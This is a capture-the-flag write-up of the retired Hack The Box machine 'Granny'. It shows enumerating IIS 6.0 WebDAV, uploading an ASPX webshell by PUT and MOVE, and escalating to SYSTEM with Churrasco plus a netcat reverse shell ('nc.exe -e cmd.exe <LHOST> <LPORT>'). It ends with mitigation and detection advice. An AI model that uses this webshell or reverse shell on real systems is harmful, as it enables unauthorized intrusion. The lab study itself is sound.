---
machine: Granny
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, iis, webdav, aspx, seimpersonate, churrasco]
---

# Granny — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

IIS 6.0 with WebDAV allows uploading an `.aspx` and moving it to an executable extension. The webshell runs as `NETWORK SERVICE`, which holds `SeImpersonatePrivilege`; Churrasco elevates it to `SYSTEM`.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80 <IP>
```

```text
80/tcp open  http  Microsoft IIS httpd 6.0
| http-methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND...
```

IIS 6.0 with WebDAV points to Windows Server 2003. Confirm with `davtest` or `cadaver`:

```bash
davtest -url http://<IP>
```

## Initial access

WebDAV allows `PUT`, but `.aspx` execution is filtered. Upload the webshell with an allowed extension and rename it with `MOVE`:

```bash
curl -T shell.aspx.txt http://<IP>/shell.aspx.txt
curl -X MOVE -H 'Destination: http://<IP>/shell.aspx' http://<IP>/shell.aspx.txt
```

The content is a minimal ASPX webshell that runs commands:

```aspx
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]).StandardOutput.ReadToEnd()); %>
```

```bash
curl 'http://<IP>/shell.aspx?c=whoami'
# nt authority\network service
```

## Escalation to SYSTEM

```bash
whoami /priv
# SeImpersonatePrivilege  Enabled
```

Upload `churrasco.exe` and `nc.exe` (via TFTP, SMB or `certutil` if available).

```bash
curl 'http://<IP>/shell.aspx?c=C:\temp\churrasco.exe -d "C:\temp\nc.exe -e cmd.exe <LHOST> <LPORT>"'
```

The listener receives an `NT AUTHORITY\SYSTEM` shell. Read and redact the flag.

## Evidence

- `nmap` showing IIS 6.0 and WebDAV verbs.
- `PUT`/`MOVE` and `whoami` output.
- `whoami /priv` with `SeImpersonatePrivilege`.
- SYSTEM shell on the listener.

## Lessons learned

- WebDAV with `PUT` and `MOVE` bypasses extension filters.
- `NETWORK SERVICE` on Server 2003 often holds `SeImpersonatePrivilege`.
- Churrasco (MS09-012) is the classic SYSTEM path on that system.
- Unsupported systems accumulate escalation vectors.

## Mitigation and detection

- Disable WebDAV or restrict `PUT`/`MOVE`.
- Update IIS and Windows Server.
- Remove `SeImpersonatePrivilege` from service accounts that do not need it.
- Detect `PUT` to double extensions and `churrasco`/`nc` processes spawned by `w3wp.exe`.

## References

- <https://www.hackthebox.com/machines/granny>
- <https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/>
- <https://attack.mitre.org/techniques/T1505/003/>
